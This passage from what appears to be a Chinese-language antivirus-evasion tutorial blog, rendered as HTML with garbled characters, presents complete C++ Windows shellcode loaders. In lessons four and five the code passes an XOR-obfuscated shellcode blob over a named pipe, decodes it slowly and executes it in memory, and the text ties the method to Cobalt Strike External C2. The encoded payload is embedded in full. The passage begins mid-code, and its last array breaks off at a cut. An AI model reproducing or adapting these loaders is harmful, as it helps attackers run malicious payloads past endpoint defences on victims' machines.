CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// ä¸€ç›´ç­‰å¾…çº¿ç¨‹æ‰§è¡Œç»“æŸ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ç¬¬å››è¯¾"><a href="#ç¬¬å››è¯¾" class="headerlink" title="ç¬¬å››è¯¾"></a>ç¬¬å››è¯¾</h1><h2 id="åˆ†ç¦»å…æ€"><a href="#åˆ†ç¦»å…æ€" class="headerlink" title="åˆ†ç¦»å…æ€"></a>åˆ†ç¦»å…æ€</h2><p><strong>åˆ†ç¦»å…æ€ï¼šå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨ç¨‹åºæœ¬èº«ä¹‹å¤–çš„ä¸€ç§åŠ è½½æ–¹å¼ã€‚</strong></p><p>å‰é¢ä¸‰è¯¾ä¸»è¦å›´ç»•ç€ç¨‹åºæœ¬èº«çš„åŠ è½½ï¼Œåé¢çš„è¯¾ç¨‹å°†å›´ç»•ç½‘ç»œã€æ•°æ®å…±äº«çš„æ–¹å¼å»å±•å¼€</p><h2 id="ç®¡é“"><a href="#ç®¡é“" class="headerlink" title="ç®¡é“"></a>ç®¡é“</h2><p>ä½•ä¸ºç®¡é“ï¼š<strong>ç®¡é“æ˜¯é€šè¿‡ç½‘ç»œæ¥å®Œæˆè¿›ç¨‹é—´çš„é€šä¿¡ï¼Œå®ƒå±è”½äº†åº•å±‚çš„ç½‘ç»œåè®®ç»†èŠ‚ã€‚</strong></p><p>é€šå¸¸ä¸Pipeç›¸å…³çš„APIéƒ½ä¸ç®¡é“æœ‰å…³ï¼ŒåŒ…æ‹¬Cobaltstrike External C2ä¹Ÿæ˜¯ç”¨çš„ç®¡é“è¿›è¡Œè¿›ç¨‹é€šä¿¡ï¼Œ<strong>ä¸€èˆ¬ç®¡é“æ˜¯ä¸€ä¸ªå…¬å¼€çš„å†…æ ¸å¯¹è±¡ï¼Œæ‰€æœ‰è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®ã€‚</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// ç­‰å¾…ç®¡é“å¯ç”¨</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// è¿æ¥ç®¡é“</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// å†…å­˜é¡µå±æ€§</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// å‚è€ƒï¼šhttps://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)RecvShellcode,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// ç”³è¯·å†…å­˜é¡µ</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// æ‹·è´å†…å­˜</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// æ‰§è¡ŒShellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ä¸€ä¸ªçº¿ç¨‹å‡½æ•°å……å½“ä¸€ä¸ªç®¡é“å®¢æˆ·ç«¯ï¼Œä½¿ç”¨ç®¡é“å®¢æˆ·ç«¯è¿æ¥ç®¡é“ï¼Œå‘é€Shellcodeï¼Œç„¶åç”±ç®¡é“æœåŠ¡ç«¯æ¥æ”¶ï¼Œå¹¶åæ··æ·†ï¼Œè¿è¡Œæœ¨é©¬çº¿ç¨‹ã€‚</p><h1 id="ç¬¬äº”è¯¾"><a href="#ç¬¬äº”è¯¾" class="headerlink" title="ç¬¬äº”è¯¾"></a>ç¬¬äº”è¯¾</h1><h2 id="çœŸæ­£æ„ä¹‰çš„åˆ†ç¦»"><a href="#çœŸæ­£æ„ä¹‰çš„åˆ†ç¦»" class="headerlink" title="çœŸæ­£æ„ä¹‰çš„åˆ†ç¦»"></a>çœŸæ­£æ„ä¹‰çš„åˆ†ç¦»</h2><p>å°†ä¸Šä¸€è¯¾çš„ä»£ç åˆ†ç¦»å¼€ç¼–è¯‘ï¼Œç„¶åé€šè¿‡ç®¡é“ä¼ è¾“ï¼Œè®©è¿›ç¨‹é€šä¿¡ã€‚</p><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png"></p><p><strong>BadCodeWithPipe</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"></span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// å†…å­˜é¡µå±æ€§</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// å‚è€ƒï¼šhttps://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// ç”³è¯·å†…å­˜é¡µ</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// æ‹·è´å†…å­˜</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿™é‡Œå¼€å§‹æ›´æ”¹å®ƒçš„å±æ€§ä¸ºå¯æ‰§è¡Œ</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// æ‰§è¡ŒShellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å®‰å…¨æè¿°ç¬¦</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// æ ˆçš„å¤§å°</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// å‡½æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// å‚æ•°</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// çº¿ç¨‹æ ‡å¿—</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// çº¿ç¨‹ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BadCodePipeClient</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x